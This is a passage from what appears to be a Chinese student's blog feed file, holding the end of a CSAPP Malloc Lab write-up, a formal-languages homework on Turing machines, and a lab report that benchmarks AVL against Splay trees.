keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>next_alloc <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>asize <span class="token operator">&gt;=</span> newsize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">remove_free_block</span><span class="token punctuation">(</span><span class="token function">NEXT_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FOOTER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span>   <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>newbp <span class="token operator">=</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>newsize<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">place</span><span class="token punctuation">(</span>newbp<span class="token punctuation">,</span> newsize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>newbp<span class="token punctuation">,</span> bp<span class="token punctuation">,</span> newsize<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">mm_free</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> newbp<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>原始的 $mm_realloc$ 没有考虑被分配块前后 $free$ $block$ 的情况, 以及 $new$ $block$ $size$ 和 $old$ $block$ $size$ 的比较, 需对此进行优化.</p></blockquote><ul><li>如果 $size$ 为 $0$, 直接调用 $mm_free$. </li><li>如果 $new$ $block$ $size$ 不大于 $old$ $block$ $size$, 直接返回原指针 $bp$ 即可.</li><li>否则, 需要考察后面邻块.<ul><li>若其未分配, 且 $size$ 和不小于 $newsize$, 则直接合并两个 $free$ $block$ 即可.</li><li>否则, 需通过 $mm_malloc$ 分配 $new$ $block$, 并进行内存 $memcpy$.</li></ul></li></ul><h3 id="Performance-2"><a href="#Performance-2" class="headerlink" title="Performance"></a>Performance</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:trace            name     valid  util     ops      secs   Kops <span class="token number">1</span>     amptjp-bal.rep       <span class="token function">yes</span>   <span class="token number">88</span>%    <span class="token number">5694</span>  <span class="token number">0.000291</span>  <span class="token number">19594</span> <span class="token number">2</span>       cccp-bal.rep       <span class="token function">yes</span>   <span class="token number">86</span>%    <span class="token number">5848</span>  <span class="token number">0.000208</span>  <span class="token number">28142</span> <span class="token number">3</span>    cp-decl-bal.rep       <span class="token function">yes</span>   <span class="token number">94</span>%    <span class="token number">6648</span>  <span class="token number">0.000386</span>  <span class="token number">17214</span> <span class="token number">4</span>       expr-bal.rep       <span class="token function">yes</span>   <span class="token number">96</span>%    <span class="token number">5380</span>  <span class="token number">0.000287</span>  <span class="token number">18739</span> <span class="token number">5</span> coalescing-bal.rep       <span class="token function">yes</span>   <span class="token number">98</span>%   <span class="token number">14400</span>  <span class="token number">0.000202</span>  <span class="token number">71111</span> <span class="token number">6</span>     random-bal.rep       <span class="token function">yes</span>   <span class="token number">88</span>%    <span class="token number">4800</span>  <span class="token number">0.000645</span>   <span class="token number">7442</span> <span class="token number">7</span>    random2-bal.rep       <span class="token function">yes</span>   <span class="token number">85</span>%    <span class="token number">4800</span>  <span class="token number">0.000747</span>   <span class="token number">6429</span> <span class="token number">8</span>     binary-bal.rep       <span class="token function">yes</span>   <span class="token number">54</span>%   <span class="token number">12000</span>  <span class="token number">0.000393</span>  <span class="token number">30519</span> <span class="token number">9</span>    binary2-bal.rep       <span class="token function">yes</span>   <span class="token number">47</span>%   <span class="token number">24000</span>  <span class="token number">0.000480</span>  <span class="token number">50042</span><span class="token number">10</span>    realloc-bal.rep       <span class="token function">yes</span>   <span class="token number">86</span>%   <span class="token number">14401</span>  <span class="token number">0.000233</span>  <span class="token number">61754</span><span class="token number">11</span>   realloc2-bal.rep       <span class="token function">yes</span>   <span class="token number">17</span>%   <span class="token number">14401</span>  <span class="token number">0.000186</span>  <span class="token number">77383</span>Total                             <span class="token number">76</span>%  <span class="token number">112372</span>  <span class="token number">0.004058</span>  <span class="token number">27692</span>Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">46</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">40</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">11</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">86</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><ul><li>$Malloc$ $Lab$ 需要用心 $DEBUG$, 并考验 $gdb$ 的使用掌握. </li><li>我从最简单的实现 —— $Implicit$ $Free$ $List$ 开始, 最后选择了 $Explicit$ $Free$ $List$ 进行实现. </li><li>根据不同 $trace$ 的组成, 我进行了分析与优化, 与 $Segmentation$ $Fault$ 日夜作战. </li><li>这次 $Lab$ 确实是对我的一次难得的体验!</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业11</title>
      <link href="/2022/12/22/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-11/"/>
      <url>/2022/12/22/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-11/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-8-2-2-c"><a href="#Ex-8-2-2-c" class="headerlink" title="Ex.8.2.2(c)"></a>Ex.8.2.2(c)</h3><p>​    一个满足条件的 $TM$ 为:<br><img src="/pic/45.png" alt=""></p><h3 id="Ex-8-2-3"><a href="#Ex-8-2-3" class="headerlink" title="Ex.8.2.3"></a>Ex.8.2.3</h3><p>​    $(a)$ 构造图灵机<br>​    <script type="math/tex">M = \left(\{q_0, q_1, q_2, q_3, q_4, q_f\}, \{0, 1, {\$}\}, \{0, 1, {\$}, B\}, \delta, q_0, B, \{q_f\}\right).</script><br>​    转移函数 $\delta$ 为:</p><script type="math/tex; mode=display">\begin{aligned}\delta(q_0, \$) &= (q_1, \$, R) \\\delta(q_1, 0) &= (q_1, 0, R) \\\delta(q_1, 1) &= (q_1, 1, R) \\\delta(q_1, B) &= (q_2, B, L) \\\delta(q_2, 0) &= (q_3, 1, L) \\\delta(q_2, 1) &= (q_4, 0, L) \\\delta(q_3, 0) &= (q_3, 0 , L) \\\delta(q_3, 1) &= (q_3, 1 , L) \\\delta(q_3, \$) &= (q_f, \$ , R) \\\delta(q_4, 0) &= (q_3, 1 , L) \\\delta(q_4, 1) &= (q_4, 0 , L) \\\delta(q_4, \$) &= (q_f, 1 , L)\end{aligned}</script><p>​    各状态的含义:</p><p>​    $q0$: 初态, 带头所扫描的符号必为 $$$;</p><p>​    $q1$: 右移状态, 当前带头所扫描的符号若为 $0$ 和 $1$ 则一直右移, 直至遇到空白带符为止；</p><p>​    $q2$: 处于二进制数的末位态, 带头所扫描的符号必为 $0$ 和 $1$, 否则无动作;</p><p>​    $q3$: 非进位左移状态, 当前带头所扫描的符号若为 $0$ 和 $1$ 则一直左移, 直至遇到 $$$为止;</p><p>​    $q4$: 进位左移状态, 带头扫描符号若为 $0$ 则将其变为 $1$, 并转 $q3$; 带头扫描符号若为 $1$ 则将其变为 $0$, 产生新的进位; 带头扫描符号若为 $$$, 产生一个新的进位.</p><p>​    $(b)$ 该 $TM$ 的 $ID$ 序列为:</p><script type="math/tex; mode=display">\begin{aligned}q_0\$111 &\vdash \$q_1111\vdash \$1q_111\vdash \$11q_11\vdash \$111q_1B\vdash \$11q_21 \\&\vdash \$1q_410\vdash \$q_4100\vdash q_4\$000\vdash q_fB1000\vdash q_f1000\end{aligned}</script><h3 id="Ex-8-2-5-b"><a href="#Ex-8-2-5-b" class="headerlink" title="Ex.8.2.5(b)"></a>Ex.8.2.5(b)</h3><p>​    这个图灵机接受的语言:<br>​    <script type="math/tex">L(M) = L(0^*11^*).</script><br>​    即语言 $L(M)$ 中的串至少包含一个 $1$, 第一个 $1$ 之前只可能出现 $0$, 每个 $1$ 之后只可能跟随 $1$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BBST</title>
      <link href="/2022/12/20/bbst/"/>
      <url>/2022/12/20/bbst/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-LAB3"><a href="#CST-LAB3" class="headerlink" title="CST LAB3"></a>CST LAB3</h1><h2 id="BBST"><a href="#BBST" class="headerlink" title="BBST"></a>BBST</h2><h3 id="一、数据结构"><a href="#一、数据结构" class="headerlink" title="一、数据结构"></a>一、数据结构</h3><p>我所实现的数据结构为 <code>AVLTree</code> 与 <code>SplayTree</code>, 现说明两个数据结构的核心接口与公共接口实现方法.</p><h4 id="1-AVLTree"><a href="#1-AVLTree" class="headerlink" title="1. AVLTree"></a>1. AVLTree</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">AvlNode</span> <span class="token punctuation">{</span>    AvlNode<span class="token operator">*</span> l<span class="token punctuation">;</span> <span class="token comment">// 左孩子.</span>    AvlNode<span class="token operator">*</span> r<span class="token punctuation">;</span> <span class="token comment">// 右孩子.</span>    <span class="token keyword">int</span> v<span class="token punctuation">;</span>      <span class="token comment">// 节点值.</span>    <span class="token keyword">int</span> h<span class="token punctuation">;</span>      <span class="token comment">// 节点高度.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">AvlTree</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> cnt<span class="token punctuation">;</span>       <span class="token comment">// 节点计数器.</span>    AvlNode<span class="token operator">*</span> Root<span class="token punctuation">;</span> <span class="token comment">// 根节点.</span>    AvlNode f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 节点数组.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考了<a href="https://www.luogu.com.cn/blog/Just-monika/solution-p3369">这篇文章</a>实现了 <code>AvlNode</code> 结构体, 并以数组形式给出 <code>AvlTree</code> 结构.</p><h5 id="1-1-Maintain"><a href="#1-1-Maintain" class="headerlink" title="1.1 Maintain()"></a>1.1 Maintain()</h5><p><code>Maintain(current)</code> 首先根据当前节点的平衡因子 <code>BanlanceFactor(current)</code> 判断是否需要调用 <code>LeftRotate()</code> 与 <code>RightRotate()</code> 接口进行左旋、右旋重构, 同时利用这两个接口实现了 <code>LeftAdjust()</code> 与 <code>RightAdjust()</code> 接口进行双旋重构.</p><h5 id="1-2-Insert-与-Remove"><a href="#1-2-Insert-与-Remove" class="headerlink" title="1.2 Insert() 与 Remove()"></a>1.2 Insert() 与 Remove()</h5><p><code>AVLTree</code> 在 <code>Insert()</code> 与 <code>Remove()</code> 后首先通过 <code>PushUp(current)</code> 进行高度更新, 将当前节点高度更新为子节点的最大高度加 $1$.</p><p><code>AVLTree</code> 在 <code>Insert()</code> 与 <code>Remove()</code> 中 <code>PushUp(current)</code>后通过 <code>Maintain(current)</code> 进行重平衡.</p><h5 id="1-3-Search"><a href="#1-3-Search" class="headerlink" title="1.3 Search()"></a>1.3 Search()</h5><p><code>AVLTree</code> 在 <code>Search()</code> 中依次判断查询值与当前节点值的大小关系, 若不相等则决定深入搜索左或右子树. 在搜索时使用 <code>AvlNode* tmp</code> 记录数值不大于查询值的最大节点. 若查询得到目标节点, 直接返回; 否则到达叶节点, 若节点值小于查询值, 根据查询方法必为数值小于查询值的最大节点, 直接返回; 若节点值大于查询值, 则返回 <code>tmp</code> 节点.</p><h5 id="1-4-复杂度分析"><a href="#1-4-复杂度分析" class="headerlink" title="1.4 复杂度分析"></a>1.4 复杂度分析</h5><p>一高度为 $h$ 的 <code>AVLTree</code> 至少有 $S(h) = fib(h) = \varPhi^h$ 个节点, 故大小为 $n$ 的 <code>AVLTree</code> 的高度为 $O(\log n)$.</p><p>每次 <code>Search()</code> 操作的复杂度正相关于树高, 为 $O(\log n)$;</p><p>每次 <code>Insert()</code> 导致的失衡通过至多一次单旋或者双旋调整即可解决, 复杂度为 $O(1)$, 总复杂度取决于搜索高度, 为 $O(\log n)$;</p><p>每次 <code>Remove()</code> 导致的失衡可能从删除节点到根节点均需进行旋转调整, 旋转次数至多为 $O(\log n)$, 总体复杂度仍为 $O(\log n)$;</p><p>综上所述, <code>AVLTree</code> 的基本操作接口的时间复杂度均为 $O(\log n)$, 共计 $n$ 次操作, 总体时间复杂度为 $O(n\log n)$.</p><h4 id="2-SplayTree"><a href="#2-SplayTree" class="headerlink" title="2. SplayTree"></a>2. SplayTree</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">SplayNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> son<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 孩子.</span>    <span class="token keyword">int</span> father<span class="token punctuation">;</span> <span class="token comment">// 父亲.</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    <span class="token comment">// 节点值.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">SplayTree</span> <span class="token punctuation">{</span>    SplayNode t<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 节点数组.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考了<a href="https://www.luogu.com.cn/blog/cjyyb/solution-p3369">这篇文章</a>实现了 <code>SplayNode</code> 结构体, 并以数组形式给出 <code>SplayTree</code> 结构.</p><h5 id="2-1-Splay"><a href="#2-1-Splay" class="headerlink" title="2.1 Splay()"></a>2.1 Splay()</h5><p>首先实现了 <code>Rotate()</code> 接口进行单旋操作, 接着利用 <code>Rotate()</code> 接口实现了 <code>Splay()</code> 接口进行双旋操作.</p><h5 id="2-2-Insert"><a href="#2-2-Insert" class="headerlink" title="2.2 Insert()"></a>2.2 Insert()</h5><p><code>SplayTree</code> 在 <code>Insert()</code> 时逐层查询需要插入节点的位置, 直到到达叶节点. 插入节点后执行 <code>Splay(pointer, 0)</code> 将其伸展至根节点即可.</p><h5 id="2-3-Remove"><a href="#2-3-Remove" class="headerlink" title="2.3 Remove()"></a>2.3 Remove()</h5><p><code>SplayTree</code> 在 <code>Remove()</code> 中首先得到待删除节点的前驱与后继 <code>pred</code>与 <code>succ</code>. 因为预先插入了最小与最大节点, 这样的前驱与后继总是存在的. 通过 <code>Splay(pred, 0); Splay(succ, pred);</code> 将 <code>pred</code> 旋转至根节点, 并将 <code>succ</code> 旋转为其右孩子. 根据 <code>BBST</code> 的定义, 此时待删除节点必为 <code>succ</code> 的左孩子, 将其置零即可.</p><h5 id="2-4-Search"><a href="#2-4-Search" class="headerlink" title="2.4 Search()"></a>2.4 Search()</h5><p><code>SplayTree</code> 在 <code>Search()</code> 中依次判断查询值与当前节点值的大小关系, 若不相等则决定深入搜索左或右子树. 在搜索时使用 <code>int tmp</code> 记录数值不大于查询值的最大节点值. 若查询得到目标节点, 直接返回; 否则到达叶节点, 若节点值小于查询值, 根据查询方法必为数值小于查询值的最大节点, 直接返回; 若节点值大于查询值, 则返回 <code>tmp</code> 即可.</p><p>同时, <code>SplayTree</code> 对于搜索到的节点需要进行 <code>Splay()</code> 操作, 将其伸展至根节点.</p><h5 id="2-5-复杂度分析"><a href="#2-5-复杂度分析" class="headerlink" title="2.5 复杂度分析"></a>2.5 复杂度分析</h5><p>根据讲义 $P664-P668$ 对 <code>SplayTree</code> 的势能分析, 对于 <code>SplayTree</code> 的连续 $m\gg n$ 次 <code>Insert()</code>, <code>Remove()</code>, <code>Search()</code> 操作的均摊时间复杂度为 <code>O(logn)</code>.</p><h3 id="二、测例设计"><a href="#二、测例设计" class="headerlink" title="二、测例设计"></a>二、测例设计</h3><h4 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a>1. 测试环境</h4><p>操作系统: <code>Linux version 4.4.0-22621-Microsoft</code>.</p><p>编译器: <code>gcc version 5.4.0 (GCC)</code>.</p><h4 id="2-设计思路"><a href="#2-设计思路" class="headerlink" title="2. 设计思路"></a>2. 设计思路</h4><p>一共设计了四类测例, 存放在本地 <code>/Data</code> 路径中, 其相应生成器文件存放在本地 <code>/Generator</code> 路径中：</p><ul><li>第一类测例模拟完全随机进行插入、删除、查找操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_1.cpp</code>, 测例文件为 <code>01.in</code> ~ <code>03.in</code>.</li><li>第二类测例模拟先插入后删除操作, 分为两组进行, 第一组 <code>80%</code> 次操作进行插入操作, <code>20%</code> 次操作进行删除操作; 第二组 <code>60%</code> 次操作进行插入操作, <code>40%</code> 操作进行删除操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_2.cpp</code>, 测例文件为 <code>04.in</code> ~ <code>09.in</code>.</li><li>第三类测例模拟先插入后查找操作, 且查找范围为全局数值, 分为两组进行, 第一组 <code>80%</code> 次操作进行插入操作, <code>20%</code> 次操作进行全局查找操作; 第二组 <code>20%</code> 次操作进行插入操作, <code>80%</code> 操作进行全局查找操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_3.cpp</code>, 测例文件为 <code>10.in</code> ~ <code>15.in</code>.</li><li>第四类测例模拟先插入后查找操作, 且查找范围为局部数值, 数值极差不超过总操作数的平方根, 分为两组进行, 第一组 <code>80%</code> 次操作进行插入操作, <code>20%</code> 次操作进行局部查找操作; 第二组 <code>20%</code> 次操作进行插入操作, <code>80%</code> 操作进行局部查找操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_4.cpp</code>, 测例文件为 <code>16.in</code> ~ <code>21.in</code>.</li></ul><h4 id="3-测例生成"><a href="#3-测例生成" class="headerlink" title="3. 测例生成"></a>3. 测例生成</h4><p>使用 <code>bitmap</code> 数据结构记录 <code>Tree</code> 中数据的存在情况. 如果 <code>bitmap</code> 某一位设置为 <code>1</code>, 则相应值的节点存在于树中, 只能进行删除操作; 如果 <code>bitmap</code> 某一位设置为 <code>0</code>, 则相应值的节点不存在于树中, 只能进行插入操作。</p><pre class="line-numbers language-cpp++" data-language="cpp++"><code class="language-cpp++">// 随机数种子.srand((int)time(0));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用当前时间作为随机数种子, 充分保证了生成数据的随机性. 尝试生成一个 <code>Insert()</code> 数据点时, 随机访问一个位置, 若 <code>bitmap-&gt;test(rand_num) == 0</code>, 则可以在该处进行插入操作, 否则随机查询下一个位置; 尝试生成一个 <code>Remove()</code> 数据点时, 随机访问一个位置, 若 <code>bitmap-&gt;test(rand_num) == 1</code>, 则可以在该处进行插入操作, 否则遍历查询其之后的位置, 直到找到一个可以删除的数据点; 尝试生成一个全局 <code>Search()</code> 数据点时, 随机访问一个位置即可; 尝试生成一个局部 <code>Search()</code> 数据点时, 首先随机访问一个位置, 并在一定范围内随机生成数据即可.</p><h4 id="4-测试脚本"><a href="#4-测试脚本" class="headerlink" title="4. 测试脚本"></a>4. 测试脚本</h4><p>编写了 <code>avl.sh</code> 脚本对 <code>AVLTree</code> 数据结构进行测试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#avl.sh</span><span class="token comment">#!/bin/bash</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">21</span><span class="token punctuation">}</span><span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Test Case <span class="token variable">$i</span>:"</span> <span class="token operator">&gt;&gt;</span> avl.out    <span class="token punctuation">{</span> <span class="token function">time</span> ./avl <span class="token operator">&lt;</span>Data/<span class="token variable">$i</span>.in <span class="token operator">&gt;</span>Data/<span class="token variable">$i</span>.out<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;&gt;</span> avl.out<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写了 <code>splay.sh</code> 脚本对 <code>SplayTree</code> 数据结构进行测试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#splay.sh</span><span class="token comment">#!/bin/bash</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">21</span><span class="token punctuation">}</span><span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Test Case <span class="token variable">$i</span>:"</span> <span class="token operator">&gt;&gt;</span> splay.out    <span class="token punctuation">{</span> <span class="token function">time</span> ./splay <span class="token operator">&lt;</span>Data/<span class="token variable">$i</span>.in <span class="token operator">&gt;</span>Data/<span class="token variable">$i</span>.out<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;&gt;</span> splay.out<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、性能分析"><a href="#三、性能分析" class="headerlink" title="三、性能分析"></a>三、性能分析</h3><h4 id="1-generator-1-cpp-数据"><a href="#1-generator-1-cpp-数据" class="headerlink" title="1. generator_1.cpp 数据"></a>1. <code>generator_1.cpp</code> 数据</h4><p>对应于 <code>01.in</code> ~ <code>03.in</code>.</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据规模</th><th style="text-align:center">AVL</th><th style="text-align:center">Splay</th></tr></thead><tbody><tr><td style="text-align:center">1e2</td><td style="text-align:center">time:0.027s</td><td style="text-align:center">time:0.028s</td></tr><tr><td style="text-align:center">1e4</td><td style="text-align:center">time:0.026s</td><td style="text-align:center">time:0.153s</td></tr><tr><td style="text-align:center">1e6</td><td style="text-align:center">time:0.540s</td><td style="text-align:center">time:0.737s</td></tr></tbody></table></div><ul><li>在完全随机数据下, <code>AVLTree</code> 性能优于 <code>SplayTree</code>.</li><li>由于数据的随机性, <code>SplayTree</code> 数据访问的局部性差, 缓存策略效果不大, 其每次操作都需进行 $O(\log n)$ 次的旋转, 性能不如 <code>AVLTree</code>. 随着数据规模的增大, <code>AVLTree</code> 的性能优势逐渐扩大.</li></ul><h4 id="2-generator-2-cpp-数据"><a href="#2-generator-2-cpp-数据" class="headerlink" title="2. generator_2.cpp 数据"></a>2. <code>generator_2.cpp</code> 数据</h4><p>对应于 <code>04.in</code> ~ <code>09.in</code>.</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据规模</th><th style="text-align:center">AVL</th><th style="text-align:center">Splay</th></tr></thead><tbody><tr><td style="text-align:center">1e2(8:2)</td><td style="text-align:center">time:0.022s</td><td style="text-align:center">time:0.015s</td></tr><tr><td style="text-align:center">1e2(6:4)</td><td style="text-align:center">time:0.021s</td><td style="text-align:center">time:0.015s</td></tr><tr><td style="text-align:center">1e4(8:2)</td><td style="text-align:center">time:0.026s</td><td style="text-align:center">time:0.023s</td></tr><tr><td style="text-align:center">1e4(6:4)</td><td style="text-align:center">time:0.025s</td><td style="text-align:center">time:0.020s</td></tr><tr><td style="text-align:center">1e6(8:2)</td><td style="text-align:center">time:1.455s</td><td style="text-align:center">time:1.730s</td></tr><tr><td style="text-align:center">1e6(6:4)</td><td style="text-align:center">time:1.273s</td><td style="text-align:center">time:2.057s</td></tr></tbody></table></div><ul><li>在先插入后删除数据下, 数据规模较小时 <code>SplayTree</code> 性能占优, 数据规模较大时 <code>AVLTree</code> 性能占优.</li><li>数据规模较小时, 两种数据结构插入与删除操作的效率相近, <code>SplayTree</code> 性能略占优; 数据规模较大时, <code>AVLTree</code> 相较 <code>SplayTree</code> 在删除操作的优势体现的更为明显.</li></ul><h4 id="3-generator-3-cpp-数据"><a href="#3-generator-3-cpp-数据" class="headerlink" title="3. generator_3.cpp 数据"></a>3. <code>generator_3.cpp</code> 数据</h4><p>对应于 <code>10.in</code> ~ <code>15.in</code>.</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据规模</th><th style="text-align:center">AVL</th><th style="text-align:center">Splay</th></tr></thead><tbody><tr><td style="text-align:center">1e2(8:2)</td><td style="text-align:center">time:0.021s</td><td style="text-align:center">time:0.023s</td></tr><tr><td style="text-align:center">1e2(2:8)</td><td style="text-align:center">time:0.027s</td><td style="text-align:center">time:0.026s</td></tr><tr><td style="text-align:center">1e4(8:2)</td><td style="text-align:center">time:0.025s</td><td style="text-align:center">time:0.024s</td></tr><tr><td style="text-align:center">1e4(2:8)</td><td style="text-align:center">time:0.025s</td><td style="text-align:center">time:0.026s</td></tr><tr><td style="text-align:center">1e6(8:2)</td><td style="text-align:center">time:1.232s</td><td style="text-align:center">time:1.512s</td></tr><tr><td style="text-align:center">1e6(2:8)</td><td style="text-align:center">time:0.739s</td><td style="text-align:center">time:1.288s</td></tr></tbody></table></div><ul><li>在先插入后删除数据下, 数据规模较小时 <code>AVLTree</code> 性能略占优, 数据规模较大时 <code>AVLTree</code> 性能明显占优.</li><li>数据规模较小时, <code>AVLTree</code> 的性能略微优于 <code>SplayTree</code>. 随着数据规模的增大, 数据访问的局部性下降, <code>AVLTree</code> 和 <code>SplayTree</code> 性能均略微下降; 由于 <code>SplayTree</code> 每次操作都需进行 $O(\log n)$ 次的旋转, 受到的影响较大, 因此 <code>AVLTree</code> 性能明显占优.</li></ul><h4 id="4-generator-4-cpp-数据"><a href="#4-generator-4-cpp-数据" class="headerlink" title="4. generator_4.cpp 数据"></a>4. <code>generator_4.cpp</code> 数据</h4><p>对应于 <code>16.in</code> ~ <code>21.in</code>.</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据规模</th><th style="text-align:center">AVL</th><th style="text-align:center">Splay</th></tr></thead><tbody><tr><td style="text-align:center">1e2(8:2)</td><td style="text-align:center">time:0.021s</td><td style="text-align:center">time:0.020s</td></tr><tr><td style="text-align:center">1e2(2:8)</td><td style="text-align:center">time:0.021s</td><td style="text-align:center">time:0.022s</td></tr><tr><td style="text-align:center">1e4(8:2)</td><td style="text-align:center">time:0.026s</td><td style="text-align:center">time:0.023s</td></tr><tr><td style="text-align:center">1e4(2:8)</td><td style="text-align:center">time:0.025s</td><td style="text-align:center">time:0.024s</td></tr><tr><td style="text-align:center">1e6(8:2)</td><td style="text-align:center">time:1.094s</td><td style="text-align:center">time:1.073s</td></tr><tr><td style="text-align:center">1e6(2:8)</td><td style="text-align:center">time:0.358s</td><td style="text-align:center">time:0.276s</td></tr></tbody></table></div><ul><li>在先插入后局部查找数据下, 数据规模较小时两种数据结构性能相近, 数据规模较大时 <code>SplayTree</code> 性能略占优.</li><li><code>SplayTree</code> 的理想优势在于数据访问的局部性, 在连续局部查找下, 搜索的数据越发集中, 随着数据规模的增大与查找操作比例的提高, <code>SplayTree</code> 的优势逐渐体现.</li></ul><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><p>在数据较为随机或无法确定数据局部性时, 应选用 <code>AVLTree</code>, 它的时间常数小, 单次时间复杂度较为稳定. 在数据访问的局部性较强时, 应选用 <code>SplayTree</code>, 可以实现较优的性能.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业10</title>
      <link href="/2022/12/17/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-10/"/>
      <url>/2022/12/17/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-10/</url>
      
